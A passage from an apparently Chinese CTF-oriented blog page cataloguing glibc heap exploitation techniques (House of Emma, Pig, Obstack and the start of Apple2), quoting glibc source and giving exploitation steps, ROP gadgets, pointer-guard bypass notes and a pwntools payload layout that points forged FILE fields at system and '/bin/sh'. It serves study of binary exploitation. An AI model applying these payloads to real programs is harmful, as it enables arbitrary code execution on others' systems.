class="literal">NULL</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">read_cb</span> (cfile-&gt;__cookie, buf, size);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">ssize_t</span></span><br><span class="line">_IO_cookie_write (FILE *fp, <span class="type">const</span> <span class="type">void</span> *buf, <span class="type">ssize_t</span> size)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">_IO_cookie_file</span> *cfile = (<span class="keyword">struct</span> _IO_cookie_file *) fp;</span><br><span class="line">  <span class="type">cookie_write_function_t</span> *write_cb = cfile-&gt;__io_functions.write; <span class="comment">//0xf0</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> PTR_DEMANGLE</span></span><br><span class="line">  <span class="built_in">PTR_DEMANGLE</span> (write_cb);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (write_cb == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      fp-&gt;_flags |= _IO_ERR_SEEN;</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="type">ssize_t</span> n = <span class="built_in">write_cb</span> (cfile-&gt;__cookie, buf, size);</span><br><span class="line">  <span class="keyword">if</span> (n &lt; size)</span><br><span class="line">    fp-&gt;_flags |= _IO_ERR_SEEN;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> n;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">off64_t</span></span><br><span class="line">_IO_cookie_seek (FILE *fp, <span class="type">off64_t</span> offset, <span class="type">int</span> dir)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">_IO_cookie_file</span> *cfile = (<span class="keyword">struct</span> _IO_cookie_file *) fp;</span><br><span class="line">  <span class="type">cookie_seek_function_t</span> *seek_cb = cfile-&gt;__io_functions.seek;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> PTR_DEMANGLE</span></span><br><span class="line">  <span class="built_in">PTR_DEMANGLE</span> (seek_cb);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> ((seek_cb == <span class="literal">NULL</span></span><br><span class="line">   || (<span class="built_in">seek_cb</span> (cfile-&gt;__cookie, &amp;offset, dir)</span><br><span class="line">       == <span class="number">-1</span>)</span><br><span class="line">   || offset == (<span class="type">off64_t</span>) <span class="number">-1</span>)</span><br><span class="line">  ? _IO_pos_BAD : offset);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">int</span></span><br><span class="line">_IO_cookie_close (FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">_IO_cookie_file</span> *cfile = (<span class="keyword">struct</span> _IO_cookie_file *) fp;</span><br><span class="line">  <span class="type">cookie_close_function_t</span> *close_cb = cfile-&gt;__io_functions.close;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> PTR_DEMANGLE</span></span><br><span class="line">  <span class="built_in">PTR_DEMANGLE</span> (close_cb);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (close_cb == <span class="literal">NULL</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">close_cb</span> (cfile-&gt;__cookie);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这四个函数作为我们考虑范围内的函数，发现其中调用的函数都是<code>_IO_cookie_file</code>的一个成员</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Special file type for fopencookie function.  */</span></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">_IO_cookie_file</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">_IO_FILE_plus</span> __fp;</span><br><span class="line">  <span class="type">void</span> *__cookie;</span><br><span class="line">  <span class="type">cookie_io_functions_t</span> __io_functions;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_IO_cookie_io_functions_t</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">cookie_read_function_t</span> *read;<span class="comment">/* Read bytes.  */</span></span><br><span class="line">  <span class="type">cookie_write_function_t</span> *write;<span class="comment">/* Write bytes.  */</span></span><br><span class="line">  <span class="type">cookie_seek_function_t</span> *seek;<span class="comment">/* Seek/tell file position.  */</span></span><br><span class="line">  <span class="type">cookie_close_function_t</span> *close;<span class="comment">/* Close file.  */</span></span><br><span class="line">&#125; <span class="type">cookie_io_functions_t</span>;</span><br></pre></td></tr></table></figure><p>但是我们发现</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">ifdef</span> PTR_DEMANGLE</span></span><br><span class="line">  <span class="built_in">PTR_DEMANGLE</span> (seek_cb);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure><p>在Glibc2.34及以上版本中的函数都进行了指针加密</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0x7ffff7e06774</span> &lt;_IO_cookie_write+<span class="number">20</span>&gt;:        ror    rax,<span class="number">0x11</span></span><br><span class="line"><span class="number">0x7ffff7e06778</span> &lt;_IO_cookie_write+<span class="number">24</span>&gt;:        <span class="keyword">xor</span>    rax,QWORD PTR fs:<span class="number">0x30</span></span><br></pre></td></tr></table></figure><p>显示右移0x11位，然后和tls里的一个数据进行了异或，因此我们只需要通过TSU，largebin attack等的手法将其改为一个特定的值，就能进行绕过，反正要么泄露要么覆盖，只要能成就行</p><p>因此，利用思路如下：</p><ul><li>截至某个 <code>IO_FILE</code> 的指针（<code>IO_list_all/stdxxx-&gt;chain</code> 等都可以）为堆地址</li><li>堆上伪造 <code>IO_FILE</code> 结构，其 <code>vtable</code> 替换为<code>_IO_cookie_jumps+XX</code>，<code>XX</code> 为一个偏移量</li><li>伪造好函数指针和调用参数，指针需要循环异或和加密（在执行<code>_IO_cookie_write</code>的时候，rdi是fake_iofile，因此可以通过gadget来ROP）</li><li>调用到<code>_IO_cookie_read</code> 等函数，进而执行任意函数</li></ul><h3 id="相关技巧-17"><a href="#相关技巧-17" class="headerlink" title="相关技巧"></a>相关技巧</h3><ul><li><p>常用的 <code>gadget</code> 有：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">;栈迁移</span><br><span class="line">mov    rbp,QWORD PTR [rdi+<span class="number">0x48</span>]</span><br><span class="line">mov    rax,QWORD PTR [rbp+<span class="number">0x18</span>]</span><br><span class="line">lea    r13,[rbp+<span class="number">0x10</span>]</span><br><span class="line">mov    DWORD PTR [rbp+<span class="number">0x10</span>],<span class="number">0x0</span></span><br><span class="line">mov    rdi,r13</span><br><span class="line">call   QWORD PTR [rax+<span class="number">0x28</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">; rdi转rdx</span><br><span class="line">mov rdx, qword ptr [rdi + <span class="number">8</span>]</span><br><span class="line">mov qword ptr [rsp], rax</span><br><span class="line">call qword ptr [rdx + <span class="number">0x20</span>]</span><br></pre></td></tr></table></figure></li><li><p><code>pointer_guard</code> 就在 <code>canary</code> 下面，偏移可能需要爆破</p></li></ul><h3 id="利用效果-17"><a href="#利用效果-17" class="headerlink" title="利用效果"></a>利用效果</h3><ul><li>任意函数执行</li></ul><h3 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h3><p>2021 湖湘杯的 House OF Emma</p><h2 id="house-of-pig"><a href="#house-of-pig" class="headerlink" title="house of pig"></a>house of pig</h2><h3 id="漏洞成因-19"><a href="#漏洞成因-19" class="headerlink" title="漏洞成因"></a>漏洞成因</h3><p>堆溢出</p><h3 id="适用范围-19"><a href="#适用范围-19" class="headerlink" title="适用范围"></a>适用范围</h3><ul><li><code>2.23</code>—— 至今</li><li>可以进行 <code>largebin attack</code></li><li>可以触发 <code>IO</code> 流操作</li></ul><h3 id="利用原理-19"><a href="#利用原理-19" class="headerlink" title="利用原理"></a>利用原理</h3><p>在<code>_IO_str_jumps</code> 中，存在着<code>_IO_str_overflow</code> 函数：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span></span><br><span class="line">_IO_str_overflow (FILE *fp, <span class="type">int</span> c)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> flush_only = c == EOF;</span><br><span class="line">  <span class="type">size_t</span> pos;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_flags &amp; _IO_NO_WRITES)</span><br><span class="line">      <span class="keyword">return</span> flush_only ? <span class="number">0</span> : EOF;</span><br><span class="line">  <span class="keyword">if</span> ((fp-&gt;_flags &amp; _IO_TIED_PUT_GET) &amp;&amp; !(fp-&gt;_flags &amp; _IO_CURRENTLY_PUTTING))</span><br><span class="line">    &#123;</span><br><span class="line">      fp-&gt;_flags |= _IO_CURRENTLY_PUTTING;</span><br><span class="line">      fp-&gt;_IO_write_ptr = fp-&gt;_IO_read_ptr;</span><br><span class="line">      fp-&gt;_IO_read_ptr = fp-&gt;_IO_read_end;</span><br><span class="line">    &#125;</span><br><span class="line">  pos = fp-&gt;_IO_write_ptr - fp-&gt;_IO_write_base;</span><br><span class="line">  <span class="keyword">if</span> (pos &gt;= (<span class="type">size_t</span>) (_IO_blen (fp) + flush_only))</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> (fp-&gt;_flags &amp; _IO_USER_BUF) <span class="comment">/* not allowed to enlarge */</span></span><br><span class="line"><span class="keyword">return</span> EOF;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> *new_buf;</span><br><span class="line">  <span class="type">char</span> *old_buf = fp-&gt;_IO_buf_base; <span class="comment">// 覆盖到这里</span></span><br><span class="line">  <span class="type">size_t</span> old_blen = _IO_blen (fp);</span><br><span class="line">  <span class="type">size_t</span> new_size = <span class="number">2</span> * old_blen + <span class="number">100</span>;</span><br><span class="line">  <span class="keyword">if</span> (new_size &lt; old_blen)</span><br><span class="line">    <span class="keyword">return</span> EOF;</span><br><span class="line">  new_buf = <span class="built_in">malloc</span> (new_size); <span class="comment">// 调用malloc</span></span><br><span class="line">  <span class="keyword">if</span> (new_buf == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/*  __ferror(fp) = 1; */</span></span><br><span class="line">      <span class="keyword">return</span> EOF;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">if</span> (old_buf)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">memcpy</span> (new_buf, old_buf, old_blen);<span class="comment">// 调用memecpy，覆盖</span></span><br><span class="line">      <span class="built_in">free</span> (old_buf); <span class="comment">// 调用free</span></span><br><span class="line">      <span class="comment">/* Make sure _IO_setb won&#x27;t try to delete _IO_buf_base. */</span></span><br><span class="line">      fp-&gt;_IO_buf_base = <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="built_in">memset</span> (new_buf + old_blen, <span class="string">&#x27;\0&#x27;</span>, new_size - old_blen);</span><br><span class="line">      <span class="comment">//......</span></span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_blen(fp) ((fp)-&gt;_IO_buf_end - (fp)-&gt;_IO_buf_base)</span></span><br></pre></td></tr></table></figure><p>只需要合理控制<code>_IO_buf_end</code>和<code>_IO_buf_base</code>就可以实现chunk的size可控，只要分配出来的chunk也可控，那么就可以在任意地址任意写</p><p>利用流程如下：</p><ul><li>先通过largebin attack将想控制的chunk_addr+0x18写上一个堆地址，然后通过tcache stashing unlink+使得分配的chunk可控</li><li>伪造一个<code>_IO_FILE_plus</code>结构，其vtable指向<code>_IO_str_jumps</code></li><li>然后伪造的<code>_IO_buf_base</code>为想写入的值的起点（所以要先在已知地址写入想写入的数据），之后合理控制<code>_IO_buf_end</code>实现控制分配chunk的大小</li><li>在 <code>memcpy</code> 中覆盖地址，如可以覆盖<code>__malloc_hook/__free_hook</code> 等</li></ul><p>该方法需要结合其他堆利用技术，需要保证 <code>malloc</code> 分配出来的 <code>chunk</code> 的地址是可控的。该方法主要提供了对 <code>IO</code> 系列函数中间接调用 <code>mallc/free/memcpy</code> 的组合利用。</p><h3 id="相关技巧-18"><a href="#相关技巧-18" class="headerlink" title="相关技巧"></a>相关技巧</h3><ul><li>可以 <code>largebin attack</code> 打掉 <code>mp_.tcachebins</code>，进而能把很大的 <code>chunk</code> 也放进入 <code>tcache</code> 进行管理</li><li>高版本没有 <code>hook</code> 的话，可以利用 <code>memcpy@got</code>，通过覆写 <code>got</code> 来进行 <code>rce</code></li><li>可以多次 <code>house of pig</code> 组合调用</li></ul><h3 id="利用效果-18"><a href="#利用效果-18" class="headerlink" title="利用效果"></a>利用效果</h3><ul><li>任意函数执行</li><li><code>ROP</code> 控制程序执行流</li></ul><h2 id="house-of-obstack"><a href="#house-of-obstack" class="headerlink" title="house of obstack"></a>house of obstack</h2><h3 id="漏洞成因-20"><a href="#漏洞成因-20" class="headerlink" title="漏洞成因"></a>漏洞成因</h3><p>堆溢出</p><h3 id="适用范围-20"><a href="#适用范围-20" class="headerlink" title="适用范围"></a>适用范围</h3><ul><li><code>2.23</code>—— 至今</li><li>可以执行一次 <code>largebin attack</code></li><li>可以触发 <code>IO</code> 流操作</li></ul><h3 id="利用原理-20"><a href="#利用原理-20" class="headerlink" title="利用原理"></a>利用原理</h3><p>一条新的利用链，伪造 <code>vtable</code> 为<code>_IO_obstack_jumps</code>，然后调用到<code>_IO_obstack_xsputn</code>，紧接着调用 <code>obstack_grow</code>，其代码为：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> obstack_grow(OBSTACK, where, length)                      \</span></span><br><span class="line"><span class="meta">  __extension__                                   \</span></span><br><span class="line"><span class="meta">    (&#123; struct obstack *__o = (OBSTACK);                       \</span></span><br><span class="line"><span class="meta">       int __len = (length);                              \</span></span><br><span class="line"><span class="meta">       <span class="keyword">if</span> (_o-&gt;next_free + __len &gt; __o-&gt;chunk_limit)                  \</span></span><br><span class="line"><span class="meta">     _obstack_newchunk (__o, __len);                      \</span></span><br><span class="line"><span class="meta">       memcpy (__o-&gt;next_free, where, __len);                     \</span></span><br><span class="line"><span class="meta">       __o-&gt;next_free += __len;                           \</span></span><br><span class="line"><span class="meta">       (void) 0; &#125;)</span></span><br></pre></td></tr></table></figure><p>然后在<code>_obstack_newchunk</code> 调用了 <code>CALL_CHUNKFUN</code> 这个宏</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line">_obstack_newchunk (<span class="keyword">struct</span> obstack *h, <span class="type">int</span> length)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">_obstack_chunk</span> *old_chunk = h-&gt;chunk;</span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">_obstack_chunk</span> *new_chunk;</span><br><span class="line">  <span class="type">long</span> new_size;</span><br><span class="line">  <span class="type">long</span> obj_size = h-&gt;next_free - h-&gt;object_base;</span><br><span class="line">  <span class="type">long</span> i;</span><br><span class="line">  <span class="type">long</span> already;</span><br><span class="line">  <span class="type">char</span> *object_base;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Compute size for new chunk.  */</span></span><br><span class="line">  new_size = (obj_size + length) + (obj_size &gt;&gt; <span class="number">3</span>) + h-&gt;alignment_mask + <span class="number">100</span>;</span><br><span class="line">  <span class="keyword">if</span> (new_size &lt; h-&gt;chunk_size)</span><br><span class="line">    new_size = h-&gt;chunk_size;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Allocate and initialize the new chunk.  */</span></span><br><span class="line">  new_chunk = <span class="built_in">CALL_CHUNKFUN</span> (h, new_size);</span><br><span class="line">  [...]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个宏会调用到函数指针：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line">_obstack_newchunk (<span class="keyword">struct</span> obstack *h, <span class="type">int</span> length)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">_obstack_chunk</span> *old_chunk = h-&gt;chunk;</span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">_obstack_chunk</span> *new_chunk;</span><br><span class="line">  <span class="type">long</span> new_size;</span><br><span class="line">  <span class="type">long</span> obj_size = h-&gt;next_free - h-&gt;object_base;</span><br><span class="line">  <span class="type">long</span> i;</span><br><span class="line">  <span class="type">long</span> already;</span><br><span class="line">  <span class="type">char</span> *object_base;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Compute size for new chunk.  */</span></span><br><span class="line">  new_size = (obj_size + length) + (obj_size &gt;&gt; <span class="number">3</span>) + h-&gt;alignment_mask + <span class="number">100</span>;</span><br><span class="line">  <span class="keyword">if</span> (new_size &lt; h-&gt;chunk_size)</span><br><span class="line">    new_size = h-&gt;chunk_size;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Allocate and initialize the new chunk.  */</span></span><br><span class="line">  new_chunk = <span class="built_in">CALL_CHUNKFUN</span> (h, new_size);</span><br><span class="line">  [...]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>因此，其就是利用该函数指针进行控制程序的执行流。</p><h3 id="相关技巧-19"><a href="#相关技巧-19" class="headerlink" title="相关技巧"></a>相关技巧</h3><p>伪造的 <code>IO_FILE</code> 布局如下：</p><ul><li>利用 <code>largebin attack</code> 伪造<code>_IO_FILE</code>，记完成伪造的 <code>chunk</code> 为 <code>A</code>（或者别的手法）</li><li><code>chunk A</code> 内偏移为 <code>0xd8</code> 处设为<code>_IO_obstack_jumps+0x20</code></li><li><code>chunk A</code> 内偏移为 <code>0xe0</code> 处设置 <code>chunk A</code> 的地址作为 <code>obstack</code> 结构体</li><li><code>chunk A</code> 内偏移为 <code>0x18</code> 处设为 <code>1</code>（<code>next_free</code>)</li><li><code>chunk A</code> 内偏移为 <code>0x20</code> 处设为 <code>0</code>（<code>chunk_limit</code>）</li><li><code>chunk A</code> 内偏移为 <code>0x48</code> 处设为 <code>&amp;/bin/sh</code></li><li><code>chunk A</code> 内偏移为 <code>0x38</code> 处设为 <code>system</code> 函数的地址</li><li><code>chunk A</code> 内偏移为 <code>0x28</code> 处设为 <code>1</code>（<code>_IO_write_ptr</code>)</li><li><code>chunk A</code> 内偏移为 <code>0x30</code> 处设为 <code>0</code> (<code>_IO_write_end</code>)</li><li><code>chunk A</code> 内偏移为 <code>0x50</code> 处设为 <code>1</code> (<code>use_extra_arg</code>)</li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">payload=<span class="built_in">flat</span>(</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="number">0x18</span>:<span class="number">1</span>,</span><br><span class="line">        <span class="number">0x20</span>:<span class="number">0</span>,</span><br><span class="line">        <span class="number">0x28</span>:<span class="number">1</span>,</span><br><span class="line">        <span class="number">0x30</span>:<span class="number">0</span>,</span><br><span class="line">        <span class="number">0x38</span>:&amp;system,</span><br><span class="line">        <span class="number">0x48</span>:&amp;/bin/sh,</span><br><span class="line">        <span class="number">0x50</span>:<span class="number">1</span>,</span><br><span class="line">        <span class="number">0xd8</span>:&amp;_IO_obstack_jumps+<span class="number">0x20</span>,</span><br><span class="line">        <span class="number">0xe0</span>:chunkA,</span><br><span class="line">    &#125;</span><br><span class="line">    filler= <span class="string">&#x27;\x00&#x27;</span></span><br><span class="line">)</span><br></pre></td></tr></table></figure><p><code>glibc-2.37</code> 开始这个方法的调用链为：<code>__printf_buffer_as_file_overflow -&gt; __printf_buffer_flush -&gt; __printf_buffer_flush_obstack-&gt;__obstack_newchunk</code>。</p><h3 id="利用效果-19"><a href="#利用效果-19" class="headerlink" title="利用效果"></a>利用效果</h3><ul><li>任意函数执行</li></ul><h2 id="house-of-apple2"><a href="#house-of-apple2" class="headerlink" title="house of apple2"></a>house of apple2</h2><h3 id="漏洞成因-21"><a href="#漏洞成因-21" class="headerlink" title="漏洞成因"></a>漏洞成因</h3><ul><li>堆溢出</li></ul><h3 id="适用范围-21"><a href="#适用范围-21" class="headerlink" title="适用范围"></a>适用范围</h3><ul><li><code>2.23</code>—— 至今</li><li>已知 <code>heap</code> 地址和 <code>glibc</code> 地址</li><li>能控制程序执行 <code>IO</code> 操作，包括但不限于：从 <code>main</code> 函数返回、调用 <code>exit</code> 函数、通过<code>__malloc_assert</code> 触发</li><li>能控制<code>_IO_FILE</code> 的 <code>vtable</code> 和<code>_wide_data</code>，一般使用 <code>largebin attack</code> 去控制</li></ul><h3 id="利用原理-21"><a href="#利用原理-21" class="headerlink" title="利用原理"></a>利用原理</h3><p>在<code>_IO_wfile_jumps</code>的<code>_IO_wfile_overflow</code> 函数中</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">wint_t</span></span><br><span class="line">_IO_wfile_overflow (FILE *f, <span class="type">wint_t</span> wch)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (f-&gt;_flags &amp; _IO_NO_WRITES) <span class="comment">/* SET ERROR */</span></span><br><span class="line">    &#123;</span><br><span class="line">      f-&gt;_flags |= _IO_ERR_SEEN;</span><br><span class="line">      __set_errno (EBADF);</span><br><span class="line">      <span class="keyword">return</span> WEOF;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="comment">/* If currently reading or no buffer allocated. */</span></span><br><span class="line">  <span class="keyword">if</span> ((f-&gt;_flags &amp; _IO_CURRENTLY_PUTTING) == <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* Allocate a buffer if needed. */</span></span><br><span class="line">      <span class="keyword">if</span> (f-&gt;_wide_data-&gt;_IO_write_base == <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">  _IO_wdoallocbuf (f);</span><br><span class="line">  _IO_free_wbackup_area (f);</span><br><span class="line">  _IO_wsetg (f, f-&gt;_wide_data-&gt;_IO_buf_base,</span><br><span class="line">     f-&gt;_wide_data-&gt;_IO_buf_base, f-&gt;_wide_data-&gt;_IO_buf_base);</span><br><span class="line">......</span><br><span class="line">    &#125;</span><br><span class="line">......</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>调用<code>_IO_wdoallocbuf (f);</code></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line">_IO_wdoallocbuf (FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_wide_data-&gt;_IO_buf_base)</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  <span class="keyword">if</span> (!(fp-&gt;_flags &amp; _IO_UNBUFFERED))</span><br><span class="line">    <span class="keyword">if</span> ((<span class="type">wint_t</span>)_IO_WDOALLOCATE (fp) != WEOF)</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">  _IO_wsetb (fp, fp-&gt;_wide_data-&gt;_shortbuf,</span><br><span class="line">     fp-&gt;_wide_data-&gt;_shortbuf + <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">libc_hidden_def</span> (_IO_wdoallocbuf)</span><br></pre></td></tr></table></figure><p>调用了<code>(wint_t)_IO_WDOALLOCATE (fp)</code>这个函数</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_WDOALLOCATE(FP) WJUMP0 (__doallocate, FP)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> WJUMP0(FUNC, THIS) (_IO_WIDE_JUMPS_FUNC(THIS)-&gt;FUNC) (THIS)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_WIDE_JUMPS_FUNC(THIS) _IO_WIDE_JUMPS(THIS)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_WIDE_JUMPS(THIS) \</span></span><br><span class="line"><span class="meta">  _IO_CAST_FIELD_ACCESS ((THIS), struct _IO_FILE, _wide_data)-&gt;_wide_vtable</span></span><br></pre></td></tr></table></figure><p>可以看到调用的是<code>_wide_vtable</code>里的<code>__doallocate</code>函数</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span 